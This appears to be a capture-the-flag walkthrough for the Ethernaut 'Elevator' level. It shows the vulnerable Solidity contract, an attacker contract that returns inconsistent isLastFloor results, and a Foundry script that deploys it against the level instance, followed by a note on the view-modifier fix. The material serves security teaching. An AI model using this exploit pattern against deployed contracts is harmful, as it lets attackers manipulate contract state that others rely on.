---
title: Elevator
weight: 12
type: docs
prev: re-entrancy
---

[Level11](https://ethernaut.openzeppelin.com/level/11) - ⭐⭐

---

This elevator won't let you reach the top of your building. Right?

### Things that might help:

- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

Solution:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Elevator {
  function top() external view returns(bool);
  function floor() external view returns(uint);
  function goTo(uint _floor) external;
}

contract Building {
  Elevator public elevator;
  bool lastFloor;

  function installElevator(address _elevator) public {
    elevator = Elevator(_elevator);
  }

  function isLastFloor(uint) public returns (bool) {
    if (lastFloor == false) {
      lastFloor = true;
      return false;
    }
    return true;
  }

  function attack(uint _floor) public {
    elevator.goTo(_floor);
  }
}
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Building} from "../src/11.sol";

interface Elevator {
  function top() external view returns(bool);
  function floor() external view returns(uint);
  function goTo(uint _floor) external;
}

contract POC is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_11");

        vm.startBroadcast(deployerPrivateKey);

        console.logUint(address(addr).balance);

        Elevator elevator = Elevator(addr);

        Building building = new Building();
        building.installElevator(addr);

        console.logBool(elevator.top());
        console.logUint(elevator.floor());

        building.attack(0);

        console.logBool(elevator.top());
        console.logUint(elevator.floor());

        vm.stopBroadcast();

    }
}
```

You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state.
Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.

An alternative way to solve this level is to build a view function
which returns different results depends on input data but don't modify
state, e.g. `gasleft()`.
